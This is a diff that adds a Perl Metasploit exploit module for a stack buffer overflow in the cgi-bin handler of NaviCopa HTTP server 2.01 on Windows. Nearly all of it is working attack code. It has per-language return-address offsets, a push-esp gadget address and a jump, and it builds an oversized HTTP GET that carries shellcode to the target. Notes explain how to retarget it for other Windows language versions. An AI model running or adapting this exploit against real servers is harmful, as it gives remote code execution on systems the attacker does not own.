@@ -1,0 +1,133 @@
+##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::Exploit::naviCopa_cgi;
+use base "Msf::Exploit";
+use strict;
+use Pex::Text;
+
+my $advanced = { };
+
+my $info =
+  {
+	'Name'    => 'Buffer Overflow in NaviCopa HTTP server 2.01 (cgi-bin)',
+	'Version' => '$Rev: 3818 $',
+	'Authors' => [ 'www.skillTube.com', ],
+
+	'Arch'  => [ 'x86' ],
+	'OS'    => [ 'win32' ],
+	'Priv'  => 1,
+
+	'AutoOpts' => { 'EXITFUNC' => 'process' },
+	'UserOpts'  =>
+	  {
+		'RHOST' => [1, 'ADDR', 'The target address'],
+		'RPORT' => [1, 'PORT', 'The target port', 80],
+		'URL'   => [1, 'DATA', 'The URL to the cgi-bin', '/cgi-bin/'],
+		'SSL'   => [0, 'BOOL', 'Use SSL'],
+	  },
+
+	'Payload' =>
+	  {
+		'Space'     => 900,
+		'BadChars'  => "\x00\x26\x3d\x0a\x0d\x25\x2b\x2e\x3f",
+	  },
+
+	'Description'  => Pex::Text::Freeform(qq{
+        This module exploits a stack overflow in the NaviCopa HTTP server 
+	2.01 (release version 6th October 2006 or earlier). It is not the
+	same vulnerability as the one described in BID 20250. 
+
+	The vulnerability was found by a member of skillTube.com and
+	allows reliable code execution. The only thing that may vary
+	is the path to the NaviCopa installation folder. On an English
+	version of Windows, it resides in the c:\\program files\\navicopa
+	directory. In that case, eip is overwritten with char 271 to 274. 
+	
+	To add a new target version of Windows (e.g. Spanish, Italian etc.),
+	you only need to change the offset to eip. As an example, in a 
+	German version of Windows, the installation directory of navicopa is
+	c:\\programme\\navicopa. As a result, the path length is four characters 
+	shorter than on an English version of Windows. As a consequence, the
+	offset to eip has to be increased by four. 
+
+	Exploit was successfully tested against Windows 2000, XP and
+	Windows Vista (regardless of ASLR).  		
+}),
+
+	'Refs'  =>  [
+		['URL', 'http://www.skilltube.com'],
+	  ],
+
+	'DefaultTarget' => 0,
+	'Targets' =>
+	  [
+		['Universal exploit for all English versions of Windows (XP,2000,Vista)', 270,  0x1002c46f],  # push esp, retn 
+		['Universal exploit for all German versions of Windows (XP,2000,Vista)', 274,  0x1002c46f],  # push esp, retn 
+	  ],
+
+	'Keys' => ['naviCopa'],
+
+	'DisclosureDate' => 'March 2007',
+  };
+
+sub new {
+	my $class = shift;
+	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
+	return($self);
+}
+
+
+sub Exploit {
+	my $self = shift;
+	my $target_host = $self->GetVar('RHOST');
+	my $target_port = $self->GetVar('RPORT');
+	my $target_path = $self->GetVar('URL');
+	my $target_idx  = $self->GetVar('TARGET');
+	my $shellcode   =$self->GetVar('EncodedPayload')->Payload;
+	my $target = $self->Targets->[$target_idx];
+
+	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);
+
+	my $pattern = "A"x900;
+	my $jmp = "\xeb\x04";
+
+	substr($pattern, $target->[1]    , 4, pack('V', $target->[2])); # ret
+	substr($pattern, $target->[1] + 42, length($jmp), $jmp);
+	substr($pattern, $target->[1] + 44   , 4, pack('V', $target->[2])); #edx 
+	substr($pattern, $target->[1] + 48 , length($shellcode), $shellcode);
+
+	my $request =
+	  "GET $target_path$pattern HTTP/1.1\r\n".
+	  "Host: $target_host:$target_port\r\n\r\n";
+
+	my $s = Msf::Socket::Tcp->new
+	  (
+		'PeerAddr'  => $target_host,
+		'PeerPort'  => $target_port,
+		'LocalPort' => $self->GetVar('CPORT'),
+		'SSL'       => $self->GetVar('SSL'),
+	  );
+	if ($s->IsError) {
+		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
+		return;
+	}
+
+	$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
+	$s->Send($request);
+
+	$self->PrintLine("[*] Waiting for a response...");
+	my $r = $s->Recv(-1, 5);
+	$s->Close();
+
+	return;
+}
+
+1;
+
+# milw0rm.com [2007-03-27]
